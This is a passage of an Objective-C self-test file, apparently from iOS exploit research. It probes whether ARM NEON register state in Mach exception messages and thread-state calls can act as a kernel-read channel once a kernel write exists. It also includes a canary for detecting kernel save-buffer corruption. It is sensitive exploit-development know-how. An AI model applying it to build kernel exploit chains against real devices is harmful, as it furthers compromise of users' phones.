//
//  P062NEONSelfTest.m
//  P007OpenOnly
//
//  P062 v1: NEON exception-state channel feasibility test.
//
//  WHY (board context, Oct 8):
//    Jamf Predator analysis: kernel<->userland data channel via ARM NEON
//    thread state (528-byte ARM_NEON_STATE64, flavor 17). If 26.5 delivers
//    that flavor in exception messages, it is a candidate kread *transport*
//    after a kernel write exists. This TAP tests ONLY the userspace half.
//
//  PHASE 1 (THE GATE): worker fills V0..V31 with magic, executes brk #0.
//    Handler receives the exception message.
//      Q1: does the message contain ARM_NEON_STATE64 (flavor 17)?
//      Q2: do the 64 qwords match the magic?
//    PASS on both -> NEON channel plumbing exists on 26.5.
//    FAIL (no NEON flavor) -> channel dead on this build; park it.
//
//  PHASE 2: thread_suspend -> thread_get_state(ARM_NEON_STATE64) ->
//    thread_set_state modified V0 -> thread_resume. Does the worker's
//    own read of V0 observe the new value? (write half of the channel.)
//
//  SAFETY / SCOPE:
//    In-process, documented Mach APIs only. No kernel primitive. Not KRW.
//    No hasKread implications. Isolation: one tap, no co-run with P044/P057.
//    Do NOT run under lldb — lldb steals brk #0.
//
//  STRUCT (Apple mach/arm/_structs.h):
//    { __uint128_t __v[32]; uint32_t __fpsr; uint32_t __fpcr; }
//    512 + 8 = 520, aligned 16 -> 528 bytes. ARM_NEON_STATE64_COUNT = 132.
//    32 registers = 64 qwords. Flavor id = 17.
//
//  LOGGING: P007 house style — NSMutableString + per-line POSIX write +
//    F_FULLFSYNC at close (P034 v2 mold). File: p062_neon_selftest_log.txt
//    (recover also accepts p06x_P062_log.txt).
//

#import "P062NEONSelfTest.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <Foundation/Foundation.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <mach/exception_types.h>
#import <mach/arm/thread_status.h>
#import <pthread.h>
#import <stdarg.h>
#import <stdio.h>
#import <string.h>
#import <unistd.h>

#define P062_BUILD @"p062-neon-selftest-v5-reorder"
/* v5 (2026-11-22, the 03:36 receipts): P1's brk is APP-FATAL — the reply
   fails 0x10000003 (MIG_BAD_ARGUMENTS, third receipt) so the exception is
   never marked handled, the kernel re-raises down the chain, and it reaches
   the crash reporter (EXC_BREAKPOINT in p062_worker_fn, the 03:36:46 .ips).
   P1 is PROVEN on both devices (64/64 x3) — it is now OPT-IN (default OFF)
   and runs LAST. PHASE A (the RPC matrix) and PHASE B (the canary) run
   FIRST — they never got to run (the app died at P1). When P1 does run, a
   TASK-level EXCEPTION_DEFAULT fallback port consumes the re-raise (the
   plain reply has no state to validate — no MIG reject — the app survives). */
/* v4 (2026-11-22): TWO additions.
   (1) PHASE A — the RPC matrix: the 1540 READ FAIL receipts (P044 witnesses,
       kr=0x90000003 = suspend MIG_BAD_ARGUMENTS 0x10000003 on EVERY scan) and
       the P1 state-reply failure (same 0x10000003) get a diagnosis matrix:
       suspend vs get_state vs task_threads-issued ports vs pthread ports,
       flavors x counts, running vs suspended. Find ANY working external read
       or close the RPC family honestly.
   (2) PHASE B — THE SELF-SAMPLING CANARY: the readback that needs NO kernel
       RPC (the 26.5 receipts: the exception path carries the state — P1 PASS
       64/64 — but the thread dies on the failed reply; the RPC family is
       rejected). The worker samples ITS OWN registers: ld1 magic -> ALU spin
       (the preemption window: the kernel saves/restores the NEON state
       through the thread-zone save buffer) -> stp q0..q31 to a sample buffer
       -> userspace diff vs canonical. A write into the save buffer between
       the save and the restore lands corrupted magic in the live regs — the
       stp catches it before the next ld1 reload erases it. This is the
       deterministic NEON canary readback. */

/* 32 NEON 128-bit registers = 64 qwords. COUNT is 132 (528/4), not 64. */
#define P062_NEON_QWORDS 64
#define P062_MAGIC_A 0x4142434445464748ULL
#define P062_MAGIC_B 0x5152535455565758ULL

#ifndef ARM_NEON_STATE64
#define ARM_NEON_STATE64 17
#endif

static NSMutableString *p062_buf;
static int p062_fd = -1;
static int p062_fd_alias = -1;

static void p062_log(NSString *fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSString *out = [line hasSuffix:@"\n"] ? line : [line stringByAppendingString:@"\n"];
    @synchronized ([P062NEONSelfTest class]) {
        if (p062_buf)
            [p062_buf appendString:out];
        if (p062_fd >= 0) {
            const char *s = out.UTF8String;
            if (s)
                write(p062_fd, s, strlen(s));
        }
        if (p062_fd_alias >= 0) {
            const char *s = out.UTF8String;
            if (s)
                write(p062_fd_alias, s, strlen(s));
        }
    }
}

static void p062_close_log(void)
{
    if (p062_fd >= 0) {
        fcntl(p062_fd, F_FULLFSYNC);
        close(p062_fd);
        p062_fd = -1;
    }
    if (p062_fd_alias >= 0) {
        fcntl(p062_fd_alias, F_FULLFSYNC);
        close(p062_fd_alias);
        p062_fd_alias = -1;
    }
}

/* ─────────────────────────── shared state ─────────────────────────── */

static volatile mach_port_t g_excPort = MACH_PORT_NULL;
static volatile thread_act_t g_workerThread = MACH_PORT_NULL;
static volatile int g_workerStarted = 0;
static volatile int g_excReceived = 0;
static int g_neonFlavorSeen = 0;
static uint32_t g_neonCountSeen = 0;
static uint64_t g_neonSeen[P062_NEON_QWORDS];
/* v3: reply state — the exception must be answered with a state reply or the
   brk propagates to the crash reporter (observed: P007OpenOnly 15:09:37). */
static int g_replyHave = 0;
static int g_replyFlavor = 0;
static uint32_t g_replyCnt = 0;
static arm_neon_state64_t g_replyState;
static int g_neonMatchCount = 0;
static int g_p1_pass = 0;
static int g_p2_pass = 0;

static volatile int g_p2_worker_ready = 0;
static volatile uint64_t g_p2_observedV0 = 0;
static volatile int g_p2_quit = 0;

static uint64_t p062_expect_qword(int q)
{
    return (q & 1) ? (P062_MAGIC_B + (uint64_t)q)
                   : (P062_MAGIC_A + (uint64_t)q);
}

static void p062_reset_globals(void)
{
    g_excPort = MACH_PORT_NULL;
    g_workerThread = MACH_PORT_NULL;
    g_workerStarted = 0;
    g_excReceived = 0;
    g_neonFlavorSeen = 0;
    g_neonCountSeen = 0;
    memset(g_neonSeen, 0, sizeof(g_neonSeen));
    g_replyHave = 0;
    g_replyCnt = 0;
    memset(&g_replyState, 0, sizeof(g_replyState));
    g_neonMatchCount = 0;
    g_p1_pass = 0;
    g_p2_pass = 0;
    g_p2_worker_ready = 0;
    g_p2_observedV0 = 0;
    g_p2_quit = 0;
}

/* Fill V0..V31 then brk in the SAME asm block so nothing clobbers NEON. */
static void p062_fill_neon_and_brk(void)
{
    uint64_t v0[P062_NEON_QWORDS] __attribute__((aligned(16)));
    for (int i = 0; i < P062_NEON_QWORDS; i++)
        v0[i] = p062_expect_qword(i);

    p062_log(@"[P1] worker: NEON loaded with magic, executing brk #0...");
    __asm__ volatile(
        "ld1 {v0.2d, v1.2d, v2.2d, v3.2d}, [%0], #64   \n"
        "ld1 {v4.2d, v5.2d, v6.2d, v7.2d}, [%0], #64   \n"
        "ld1 {v8.2d, v9.2d, v10.2d, v11.2d}, [%0], #64 \n"
        "ld1 {v12.2d, v13.2d, v14.2d, v15.2d}, [%0], #64\n"
        "ld1 {v16.2d, v17.2d, v18.2d, v19.2d}, [%0], #64\n"
        "ld1 {v20.2d, v21.2d, v22.2d, v23.2d}, [%0], #64\n"
        "ld1 {v24.2d, v25.2d, v26.2d, v27.2d}, [%0], #64\n"
        "ld1 {v28.2d, v29.2d, v30.2d, v31.2d}, [%0]    \n"
        "brk #0                                        \n"
        :
        : "r"(v0)
        : "v0","v1","v2","v3","v4","v5","v6","v7",
          "v8","v9","v10","v11","v12","v13","v14","v15",
          "v16","v17","v18","v19","v20","v21","v22","v23",
          "v24","v25","v26","v27","v28","v29","v30","v31", "memory"
    );
}

static void *p062_worker_fn(void *arg)
{
    (void)arg;
    g_workerThread = mach_thread_self();

    kern_return_t kr = thread_set_exception_ports(
        g_workerThread,
        EXC_MASK_BREAKPOINT,
        g_excPort,
        EXCEPTION_STATE | MACH_EXCEPTION_CODES,
        ARM_NEON_STATE64);
    if (kr != KERN_SUCCESS) {
        p062_log(@"[P1] thread_set_exception_ports kr=0x%x — cannot request "
                 @"NEON state flavor %d", kr, ARM_NEON_STATE64);
        return NULL;
    }
    p062_log(@"[P1] exception port set, flavor=ARM_NEON_STATE64 (%d), "
             @"behavior=EXCEPTION_STATE|MACH_EXCEPTION_CODES",
             ARM_NEON_STATE64);

    g_workerStarted = 1;
    p062_fill_neon_and_brk();
    p062_log(@"[P1] worker: returned from brk (exception not consumed?)");
    return NULL;
}

static void p062_parse_exc_msg(mach_msg_header_t *mh, uint8_t *msgbuf)
{
    p062_log(@"[P1] handler: exception message received, msgh_id=%d "
             @"msgh_size=%u msgh_bits=0x%x",
             mh->msgh_id, mh->msgh_size, mh->msgh_bits);

    if (mh->msgh_size < sizeof(mach_msg_header_t) + 8)
        return;

    uint32_t *words = (uint32_t *)(msgbuf + sizeof(mach_msg_header_t));
    uint32_t nwords = (mh->msgh_size - (uint32_t)sizeof(mach_msg_header_t)) / 4;
    uint32_t dump_n = nwords < 24 ? nwords : 24;
    NSMutableString *hex = [NSMutableString stringWithString:@"[P1] handler: body u32s:"];
    for (uint32_t i = 0; i < dump_n; i++)
        [hex appendFormat:@" %08x", words[i]];
    p062_log(@"%@", hex);

    /*
     * EXCEPTION_STATE | MACH_EXCEPTION_CODES appends:
     *   flavor:int, old_stateCnt:int, old_state[cnt]
     * after NDR + exception + 64-bit codes. Scan rather than hard-offset:
     * MIG packing of the 64-bit codes is pack(4).
     *
     * COUNT is 132 (528/4). Window MUST include 132 — the draft's
     * `cnt <= 128` was a false-FAIL bug.
     */
    int foundIdx = -1;
    for (uint32_t i = 0; i + 1 < nwords; i++) {
        if (words[i] != (uint32_t)ARM_NEON_STATE64)
            continue;
        uint32_t cnt = words[i + 1];
        /* COUNT is 132. Window MUST include 132 (draft cnt<=128 false-FAIL). */
        if (cnt >= 64 && cnt <= 160 && (i + 2 + cnt) <= nwords) {
            foundIdx = (int)i;
            g_neonFlavorSeen = 1;
            g_neonCountSeen = cnt;
            if (cnt <= ARM_NEON_STATE64_COUNT) {
                g_replyFlavor = (int)ARM_NEON_STATE64;
                g_replyCnt = cnt;
                memcpy(&g_replyState, &words[i + 2], (size_t)cnt * 4);
                g_replyHave = 1;
            }
            uint64_t *st = (uint64_t *)&words[i + 2];
            uint32_t nq = cnt / 2;
            if (nq > P062_NEON_QWORDS)
                nq = P062_NEON_QWORDS;
            for (uint32_t q = 0; q < nq; q++)
                g_neonSeen[q] = st[q];
            break;
        }
    }

    if (foundIdx >= 0) {
        int match = 0;
        for (int q = 0; q < P062_NEON_QWORDS; q++) {
            if (g_neonSeen[q] == p062_expect_qword(q))
                match++;
        }
        g_neonMatchCount = match;
        p062_log(@"[P1] handler: ARM_NEON_STATE64 found at word %d, count=%u "
                 @"(ARM_NEON_STATE64_COUNT=%u)",
                 foundIdx, g_neonCountSeen, (unsigned)ARM_NEON_STATE64_COUNT);
        p062_log(@"[P1] handler: magic match %d/%d qwords  "
                 @"V0=0x%016llx 0x%016llx",
                 match, P062_NEON_QWORDS, g_neonSeen[0], g_neonSeen[1]);
        if (match >= 28) {
            g_p1_pass = 1;
            p062_log(@"[P1] *** PHASE 1 PASS — exception message carries NEON state ***");
        } else if (match > 0) {
            p062_log(@"[P1] PARTIAL — some NEON state present but mismatched (%d/%d)",
                     match, P062_NEON_QWORDS);
        } else {
            p062_log(@"[P1] NEON flavor present but NO magic match — "
                     @"values may be post-fault state, not pre-brk state");
        }
    } else {
        p062_log(@"[P1] handler: ARM_NEON_STATE64 NOT found in message "
                 @"(%u words scanned, flavor id %d, COUNT %u)",
                 nwords, ARM_NEON_STATE64, (unsigned)ARM_NEON_STATE64_COUNT);
        p062_log(@"[P1] *** PHASE 1 FAIL — NEON channel not plumbed on this build ***");
    }
}

/* v3: answer a MACH_EXCEPTION state request. A MIG state reply is
   header + NDR_record + retcode + flavor + new_stateCnt + new_state.
   Without this the exception is not marked handled and the brk is
   re-delivered to the task/crash reporter (the 15:09:37 app kill). */
static kern_return_t p062_send_state_reply(mach_msg_header_t *req, const uint8_t *reqBody)
{
    if (!g_replyHave) {
        p062_log(@"[P1] handler: no NEON state captured — replying FAILURE");
        return KERN_FAILURE;
    }
    size_t stateBytes = (size_t)g_replyCnt * 4;
    if (stateBytes > sizeof(g_replyState)) stateBytes = sizeof(g_replyState);
    uint8_t buf[sizeof(mach_msg_header_t) + 8 + 4 + 4 + 4 + sizeof(arm_neon_state64_t)];
    memset(buf, 0, sizeof(buf));
    size_t total = sizeof(mach_msg_header_t) + 8 + 4 + 4 + 4 + stateBytes;

    mach_msg_header_t *rh = (mach_msg_header_t *)buf;
    rh->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MOVE_SEND_ONCE, 0);
    rh->msgh_size = (mach_msg_size_t)total;
    rh->msgh_remote_port = req->msgh_local_port;
    rh->msgh_local_port = MACH_PORT_NULL;
    rh->msgh_voucher_port = MACH_PORT_NULL;
    rh->msgh_id = req->msgh_id + 1;

    uint8_t *p = buf + sizeof(mach_msg_header_t);
    memcpy(p, reqBody, 8);              /* NDR_record_t from the request */
    p += 8;
    *(kern_return_t *)p = KERN_SUCCESS; p += 4;
    *(int *)p = g_replyFlavor;          p += 4;
    *(uint32_t *)p = g_replyCnt;        p += 4;
    memcpy(p, &g_replyState, stateBytes);

    kern_return_t kr = mach_msg(rh, MACH_SEND_MSG, (mach_msg_size_t)total, 0,
                                MACH_PORT_NULL, 0, MACH_PORT_NULL);
    p062_log(@"[P1] handler: state reply id=%d flavor=%d cnt=%u remote=0x%x kr=0x%x",
             rh->msgh_id, g_replyFlavor, g_replyCnt,
             (unsigned)rh->msgh_remote_port, kr);
    return kr;
}

static void *p062_exc_handler_fn(void *arg)
{
    (void)arg;
    uint8_t msgbuf[0x2000];
    memset(msgbuf, 0, sizeof(msgbuf));
    mach_msg_header_t *mh = (mach_msg_header_t *)msgbuf;

    kern_return_t kr = mach_msg(mh,
                                MACH_RCV_MSG | MACH_RCV_TIMEOUT,
                                0,
                                sizeof(msgbuf),
                                g_excPort,
                                5000, /* ms — do not hang the TAP */
                                MACH_PORT_NULL);
    if (kr != MACH_MSG_SUCCESS) {
        p062_log(@"[P1] handler: mach_msg receive kr=0x%x "
                 @"(timeout=0x10004003 if nothing arrived)", kr);
        return NULL;
    }
    g_excReceived = 1;
    p062_log(@"[P1] handler: msg remote=0x%x local=0x%x",
             (unsigned)mh->msgh_remote_port, (unsigned)mh->msgh_local_port);
    p062_parse_exc_msg(mh, msgbuf);

    kern_return_t rkr = p062_send_state_reply(mh, msgbuf + sizeof(mach_msg_header_t));

    if (g_workerThread != MACH_PORT_NULL) {
        /* brk #0 parks the pthread in exception-wait. Terminate often
         * returns KERN_FAILURE (0x35). Do not pthread_join that worker. */
        (void)thread_abort(g_workerThread);
        kern_return_t tr = thread_terminate(g_workerThread);
        p062_log(@"[P1] worker thread_abort+terminate kr=0x%x (0x35 = already dying; TAP will not join)", tr);
    }

    /* v3: if the thread re-executed the brk before dying, absorb the repeat
       so it does not reach the crash reporter. */
    for (int i = 0; i < 3 && rkr == KERN_SUCCESS; i++) {
        memset(msgbuf, 0, sizeof(msgbuf));
        kr = mach_msg(mh, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(msgbuf),
                      g_excPort, 150, MACH_PORT_NULL);
        if (kr != MACH_MSG_SUCCESS) break;
        p062_log(@"[P1] handler: repeat exception id=%d — absorbing", mh->msgh_id);
        p062_send_state_reply(mh, msgbuf + sizeof(mach_msg_header_t));
        if (g_workerThread != MACH_PORT_NULL) {
            (void)thread_abort(g_workerThread);
            (void)thread_terminate(g_workerThread);
        }
    }
    return NULL;
}

/* ─────────────────────────── Phase 2 ─────────────────────────── */

static void *p062_p2_worker_fn(void *arg)
{
    (void)arg;
    g_p2_worker_ready = 1;
    uint64_t v0[2] __attribute__((aligned(16)));
    while (!g_p2_quit) {
        __asm__ volatile(
            "stp q0, q1, [%0]\n"
            :
            : "r"(v0)
            : "memory"
        );
        g_p2_observedV0 = v0[0];
        usleep(1000);
    }
    return NULL;
}

static void p062_phase2(void)
{
    p062_log(@"");
    p062_log(@"=== PHASE 2: suspend / get_state / set_state / resume ===");

    pthread_t th;
    g_p2_quit = 0;
    g_p2_worker_ready = 0;
    g_p2_observedV0 = 0;
    if (pthread_create(&th, NULL, p062_p2_worker_fn, NULL) != 0) {
        p062_log(@"[P2] pthread_create failed");
        return;
    }
    for (int i = 0; i < 100 && !g_p2_worker_ready; i++)
        usleep(1000);

    thread_act_t target = pthread_mach_thread_np(th);
    kern_return_t kr = thread_suspend(target);
    p062_log(@"[P2] thread_suspend kr=0x%x", kr);

    arm_neon_state64_t neon;
    memset(&neon, 0, sizeof(neon));
    mach_msg_type_number_t cnt = ARM_NEON_STATE64_COUNT;
    kr = thread_get_state(target, ARM_NEON_STATE64,
                          (thread_state_t)&neon, &cnt);
    if (kr != KERN_SUCCESS) {
        p062_log(@"[P2] thread_get_state(ARM_NEON_STATE64) kr=0x%x — "
                 @"flavor not supported for get?", kr);
        thread_resume(target);
        g_p2_quit = 1;
        pthread_join(th, NULL);
        return;
    }
    p062_log(@"[P2] baseline get OK, count=%u", cnt);

    uint64_t newV0[2] = { 0xDEADC0DEDEADC0DEULL, 0xCAFEBABECAFEBABEULL };
    memcpy(&neon.__v[0], newV0, sizeof(newV0));
    kr = thread_set_state(target, ARM_NEON_STATE64,
                          (thread_state_t)&neon, ARM_NEON_STATE64_COUNT);
    if (kr != KERN_SUCCESS) {
        p062_log(@"[P2] thread_set_state kr=0x%x — write half not available", kr);
        thread_resume(target);
        g_p2_quit = 1;
        pthread_join(th, NULL);
        return;
    }
    p062_log(@"[P2] set_state OK");

    kr = thread_resume(target);
    p062_log(@"[P2] thread_resume kr=0x%x", kr);

    usleep(50000);
    uint64_t obs = g_p2_observedV0;
    p062_log(@"[P2] worker observed V0 = 0x%016llx (want 0xDEADC0DEDEADC0DE)",
             obs);
    if (obs == 0xDEADC0DEDEADC0DEULL) {
        g_p2_pass = 1;
        p062_log(@"[P2] *** PHASE 2 PASS — set_state->resume->register "
                 @"persistence works ***");
    } else {
        p062_log(@"[P2] worker did not observe new value — NEON set_state "
                 @"may not persist across resume on this build");
    }

    g_p2_quit = 1;
    pthread_join(th, NULL);
}

/* ─────────── v5: the TASK-level fallback exception handler ───────────
   The 03:36:46 receipt: P1's brk escapes to the crash reporter (the state
   reply fails 0x10000003 -> the exception is unhandled -> the kernel
   re-raises down the chain). This handler sits at the TASK level with
   EXCEPTION_DEFAULT (the PLAIN raise — no state in the reply, nothing for
   MIG to reject). When the re-raise arrives: terminate the faulting thread
   (its port is in the message body) and reply KERN_SUCCESS — the app
   survives, the worker dies cleanly, no brk ping-pong. */
static mach_port_t g_taskExcPort = MACH_PORT_NULL;

static void *p062_task_exc_fn(void *arg)
{
    (void)arg;
    uint8_t buf[256];
    memset(buf, 0, sizeof buf);
    mach_msg_header_t *mh = (mach_msg_header_t *)buf;
    kern_return_t kr = mach_msg(mh, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
                                sizeof buf, g_taskExcPort, 4000,
                                MACH_PORT_NULL);
    if (kr != MACH_MSG_SUCCESS) return NULL;
    /* the plain mach_exception_raise body: NDR(8) then the thread/task
       ports. Parse defensively and log the raw words (the receipts guide
       the next iteration if the offsets drift). */
    uint32_t *w = (uint32_t *)(buf + sizeof(mach_msg_header_t) + 8);
    p062_log(@"[P1-fallback] task-level re-raise: id=%d words=%08x %08x %08x %08x",
             mh->msgh_id, w[0], w[1], w[2], w[3]);
    thread_act_t th = (thread_act_t)w[0];   /* the body's thread port */
    if (th) {
        (void)thread_terminate(th);
        p062_log(@"[P1-fallback] faulting thread terminated — the app survives");
    }
    /* the plain reply: {header, NDR, RetCode=KERN_SUCCESS} — no state */
    uint8_t rbuf[sizeof(mach_msg_header_t) + 8 + 4];
    memset(rbuf, 0, sizeof rbuf);
    mach_msg_header_t *rh = (mach_msg_header_t *)rbuf;
    rh->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MOVE_SEND_ONCE, 0);
    rh->msgh_size = (mach_msg_size_t)sizeof rbuf;
    rh->msgh_remote_port = mh->msgh_local_port;
    rh->msgh_local_port = MACH_PORT_NULL;
    rh->msgh_voucher_port = MACH_PORT_NULL;
    rh->msgh_id = mh->msgh_id + 100;   /* the reply id (raise -> raise_reply) */
    kern_return_t *rc = (kern_return_t *)(rbuf + sizeof(mach_msg_header_t) + 8);
    *rc = KERN_SUCCESS;
    kr = mach_msg(rh, MACH_SEND_MSG, rh->msgh_size, 0,
                  MACH_PORT_NULL, 0, MACH_PORT_NULL);
    p062_log(@"[P1-fallback] plain reply kr=0x%x (KERN_SUCCESS = consumed)", kr);
    return NULL;
}

/* v5: P1 extracted — the opt-in brk test with the task-level fallback armed
   around it. PROVEN 64/64 on both devices; APP-FATAL while unconsumed
   without the fallback. */
static void p062_p1_run(void)
{
    p062_log(@"");
    p062_log(@"=== PHASE 1 (opt-in): exception message NEON visibility ===");
    /* arm the task-level fallback FIRST (the survival net) */
    kern_return_t kpt = mach_port_allocate(mach_task_self(),
                                           MACH_PORT_RIGHT_RECEIVE, &g_taskExcPort);
    if (kpt == KERN_SUCCESS) {
        kpt = mach_port_insert_right(mach_task_self(), g_taskExcPort,
                                     g_taskExcPort, MACH_MSG_TYPE_MAKE_SEND);
        if (kpt == KERN_SUCCESS) {
            /* EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES on EXC_BREAKPOINT */
            kpt = task_set_exception_ports(mach_task_self(), EXC_MASK_BREAKPOINT,
                                           g_taskExcPort,
                                           EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES,
                                           THREAD_STATE_NONE);
            p062_log(@"[P1-fallback] task-level port armed kr=0x%x", kpt);
            pthread_t fbTh;
            pthread_create(&fbTh, NULL, p062_task_exc_fn, NULL);
            pthread_detach(fbTh);
        }
    }

    /* the P1 flow (the thread-level STATE port — moved from the tap) */
    kern_return_t kpr = mach_port_allocate(mach_task_self(),
                                           MACH_PORT_RIGHT_RECEIVE, (mach_port_t *)&g_excPort);
    if (kpr != KERN_SUCCESS) {
        p062_log(@"[-] exc port alloc kr=0x%x — abort", kpr);
        return;
    }
    kpr = mach_port_insert_right(mach_task_self(), g_excPort, g_excPort,
                                 MACH_MSG_TYPE_MAKE_SEND);
    if (kpr != KERN_SUCCESS) {
        p062_log(@"[-] exc port insert send right kr=0x%x — abort", kpr);
        mach_port_destroy(mach_task_self(), g_excPort);
        g_excPort = MACH_PORT_NULL;
        return;
    }

    pthread_t excTh, wTh;
    pthread_create(&excTh, NULL, p062_exc_handler_fn, NULL);
    usleep(50000);

    if (pthread_create(&wTh, NULL, p062_worker_fn, NULL) == 0) {
        /* Worker sits in brk #0 until the exception reply. Joining it
         * hangs the TAP (recover stops after handler terminate). */
        pthread_detach(wTh);
    }

    for (int i = 0; i < 100 && !g_excReceived; i++)
        usleep(50000);

    if (g_workerThread != MACH_PORT_NULL) {
        (void)thread_abort(g_workerThread);
        (void)thread_terminate(g_workerThread);
    }

    if (!g_excReceived && g_excPort != MACH_PORT_NULL) {
        mach_port_destroy(mach_task_self(), g_excPort);
        g_excPort = MACH_PORT_NULL;
    }
    pthread_join(excTh, NULL);
    p062_log(@"[P1] handler joined; brk worker detached (no pthread_join)");

    p062_log(@"[P1] summary: excReceived=%d neonFlavorSeen=%d count=%u magicMatch=%d/%d",
             g_excReceived, g_neonFlavorSeen, g_neonCountSeen,
             g_neonMatchCount, P062_NEON_QWORDS);

    if (g_workerThread != MACH_PORT_NULL) {
        mach_port_deallocate(mach_task_self(), g_workerThread);
        g_workerThread = MACH_PORT_NULL;
    }
    if (g_excPort != MACH_PORT_NULL) {
        mach_port_destroy(mach_task_self(), g_excPort);
        g_excPort = MACH_PORT_NULL;
    }
}

/* ─────────────────── v4 PHASE A: the RPC matrix ───────────────────
   The 1540 P044 READ-FAIL receipts + the P1 reply failure: the whole
   thread-state RPC family returned MIG_BAD_ARGUMENTS (0x10000003) on 23F77.
   This matrix isolates WHERE: suspend vs get, running vs suspended,
   pthread-issued vs task_threads-issued ports, flavor x count variants. */
static void p062_phaseA(void)
{
    p062_log(@"");
    p062_log(@"=== PHASE A: the thread-state RPC matrix (the 0x10000003 hunt) ===");

    pthread_t th;
    g_p2_quit = 0; g_p2_worker_ready = 0; g_p2_observedV0 = 0;
    if (pthread_create(&th, NULL, p062_p2_worker_fn, NULL) != 0) {
        p062_log(@"[A] pthread_create failed"); return;
    }
    for (int i = 0; i < 100 && !g_p2_worker_ready; i++) usleep(1000);

    thread_act_t pp = pthread_mach_thread_np(th);
    arm_neon_state64_t st;
    mach_msg_type_number_t cnt;

    /* A1: suspend alone (the P044 receipts: 0x10000003 here) */
    kern_return_t k1 = thread_suspend(pp);
    p062_log(@"[A1] thread_suspend(pthread port) kr=0x%x %s", k1,
             k1 == KERN_SUCCESS ? "(the P044 wall did NOT reproduce — big)" :
             "(the wall reproduces — see A5 for the port-class variant)");

    /* A2: get on the SUSPENDED thread (only if A1 worked) */
    if (k1 == KERN_SUCCESS) {
        cnt = ARM_NEON_STATE64_COUNT;
        kern_return_t k2 = thread_get_state(pp, ARM_NEON_STATE64,
                                            (thread_state_t)&st, &cnt);
        p062_log(@"[A2] get(NEON,suspended) kr=0x%x cnt=%u", k2, cnt);
        cnt = 68;
        kern_return_t k3 = thread_get_state(pp, ARM_THREAD_STATE64,
                                            (thread_state_t)&st, &cnt);
        p062_log(@"[A3] get(THREAD64,suspended) kr=0x%x cnt=%u", k3, cnt);
        thread_resume(pp);
    }

    /* A4: get on a RUNNING thread (no suspend) */
    cnt = ARM_NEON_STATE64_COUNT;
    kern_return_t k4 = thread_get_state(pp, ARM_NEON_STATE64,
                                        (thread_state_t)&st, &cnt);
    p062_log(@"[A4] get(NEON,running,no-suspend) kr=0x%x cnt=%u", k4, cnt);

    /* A5: the port CLASS variant — task_threads()-issued ports carry a
       different right provenance than pthread_mach_thread_np. If the app
       can call task_threads at all, try suspend+get on THOSE. */
    {
        thread_act_array_t ths = NULL; mach_msg_type_number_t n = 0;
        kern_return_t kt = task_threads(mach_task_self(), &ths, &n);
        p062_log(@"[A5] task_threads kr=0x%x n=%u", kt, n);
        if (kt == KERN_SUCCESS && n > 0) {
            kern_return_t ks = thread_suspend(ths[0]);
            cnt = ARM_NEON_STATE64_COUNT;
            kern_return_t kg = (ks == KERN_SUCCESS)
                ? thread_get_state(ths[0], ARM_NEON_STATE64,
                                   (thread_state_t)&st, &cnt) : ks;
            p062_log(@"[A5] suspend(task-issued[0]) kr=0x%x get kr=0x%x cnt=%u",
                     ks, kg, cnt);
            if (ks == KERN_SUCCESS) thread_resume(ths[0]);
            for (mach_msg_type_number_t i = 0; i < n; i++)
                mach_port_deallocate(mach_task_self(), ths[i]);
            vm_deallocate(mach_task_self(), (vm_address_t)ths,
                          n * sizeof(thread_act_t));
        }
    }

    g_p2_quit = 1; pthread_join(th, NULL);
    p062_log(@"[A] matrix done — any KERN_SUCCESS row above = a live external "
             @"read path (feed it to the P044 witnesses); all 0x10000003 = "
             @"the RPC family is closed on this build (the self-sampling "
             @"canary is the readback).");
}

/* ─────────────── v4 PHASE B: the self-sampling canary ───────────────
   NO kernel RPC. The worker: ld1 the canonical magic -> ALU spin (the
   preemption window: the kernel saves/restores through the thread-zone
   NEON save buffer) -> stp its OWN q0..q31 to a sample buffer -> diff.
   A write into the save buffer between save and restore loads corrupted
   magic into the live regs — the stp catches it before the next ld1. */
#define P062_CANARY_N 8
typedef struct {
    uint64_t magic[64]  __attribute__((aligned(16)));
    uint64_t sample[64] __attribute__((aligned(16)));
    volatile uint64_t iters, diffs;
    volatile int ready, quit;
    pthread_t th;
} p062_can_t;
static p062_can_t g_can[P062_CANARY_N];

static void *p062_canary_fn(void *arg)
{
    p062_can_t *c = (p062_can_t *)arg;
    int wid = (int)(c - g_can);
    for (int q = 0; q < 64; q++)
        c->magic[q] = 0x4e45000000000000ULL | ((uint64_t)wid << 32) | (uint64_t)q;
    c->ready = 1;
    while (!c->quit) {
        __asm__ volatile(
            "ld1 {v0.2d, v1.2d, v2.2d, v3.2d}, [%0], #64    \n"
            "ld1 {v4.2d, v5.2d, v6.2d, v7.2d}, [%0], #64    \n"
            "ld1 {v8.2d, v9.2d, v10.2d, v11.2d}, [%0], #64  \n"
            "ld1 {v12.2d, v13.2d, v14.2d, v15.2d}, [%0], #64\n"
            "ld1 {v16.2d, v17.2d, v18.2d, v19.2d}, [%0], #64\n"
            "ld1 {v20.2d, v21.2d, v22.2d, v23.2d}, [%0], #64\n"
            "ld1 {v24.2d, v25.2d, v26.2d, v27.2d}, [%0], #64\n"
            "ld1 {v28.2d, v29.2d, v30.2d, v31.2d}, [%0]     \n"
            :
            : "r"(c->magic)
            : "v0","v1","v2","v3","v4","v5","v6","v7","v8","v9","v10","v11",
              "v12","v13","v14","v15","v16","v17","v18","v19","v20","v21",
              "v22","v23","v24","v25","v26","v27","v28","v29","v30","v31",
              "memory");
        /* the preemption window: pure-ALU spin (NEON stays loaded) */
        for (volatile int s = 0; s < 4000; s++)
            __asm__ volatile("nop");
        /* SELF-SAMPLE before the next ld1 erases any restored corruption */
        __asm__ volatile(
            "stp q0, q1, [%0, #0]\n"
            "stp q2, q3, [%0, #32]\n"
            "stp q4, q5, [%0, #64]\n"
            "stp q6, q7, [%0, #96]\n"
            "stp q8, q9, [%0, #128]\n"
            "stp q10, q11, [%0, #160]\n"
            "stp q12, q13, [%0, #192]\n"
            "stp q14, q15, [%0, #224]\n"
            "stp q16, q17, [%0, #256]\n"
            "stp q18, q19, [%0, #288]\n"
            "stp q20, q21, [%0, #320]\n"
